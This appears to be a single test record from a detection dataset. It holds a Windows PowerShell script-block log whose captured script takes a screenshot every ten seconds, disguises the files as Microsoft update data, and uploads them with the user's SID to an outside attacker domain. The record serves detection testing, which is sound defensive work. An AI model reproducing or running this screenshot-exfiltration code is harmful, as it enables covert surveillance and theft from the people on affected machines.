  {"expect":true,"source":"attack_data","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"MessageNumber":"1","MessageTotal":"1","Path":"","ScriptBlockId":"2ae5280c-b0aa-4b8d-a189-ad15191a7c0b","ScriptBlockText":"[Reflection.Assembly]::LoadWithPartialName('System.Drawing');\n function screenshot([Drawing.Rectangle]$bounds, $path) \n {\n $bmp = New-Object Drawing.Bitmap $bound.width, $bound.height;\n $graphics = [Drawing.Graphics]::FromImage($bmp);\n $graphics.CopyFromScreen($bound.Location, [Drawing.Point]::Empty, $bound.size);\n $bmp.Save($path);\n $graphics.Dispose();\n $bmp.Dispose()\n };\n $bounds = [Drawing.Rectangle]::FromLTRB(0,0,1900,1080);\n function downloadFileUP($f){$name=$f.repalce(':\\','').replace('\\','/');\n $valu=([System.Security.Principal.WindosIdentity]::GetCurrent()).User.Value;\n $vu=$valu+$name;\n Invoke-RestMethod -Uri 'https://wintervivern.com/screenshot.php' -Method Post -InFile $f -Headers@{'filename=$vu'} -UseDefaultCredentials};\n $i=0;\n while($true)\n {\n $i=$i+1;$f='c:\\Users\\Public\\MicrosoftUpdateClient\\Microsoft_Update_tool_'+$i+'.dat';\n screenshot $bounds $f;\n sleep 1;\n downloadFileUP($f);\n sleep 9;\n remote-Item $f -Force\n }"}}
